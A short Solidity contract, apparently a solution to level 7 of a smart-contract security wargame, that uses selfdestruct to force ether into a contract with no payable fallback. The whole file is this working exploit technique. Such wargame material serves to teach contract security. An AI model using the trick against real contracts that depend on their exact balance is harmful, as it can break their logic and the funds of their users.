// SPDX-License-Identifier: MIT
pragma solidity >= 0.8.0;

/// @dev self destructs forcibly sending ether to the required address
/// This passes L7 sending ether forcibly to the level instance
/// containing empty contract even without any fallback functions.
/// You can even make a fallback function but remember to mark it
/// as `payable`.
contract ForceEther {
	address private owner;

	constructor() payable {
		owner = msg.sender;
	}

	function selfDestruct(address _addr) public {
		require(msg.sender == owner);
		selfdestruct(payable(_addr));
	}
}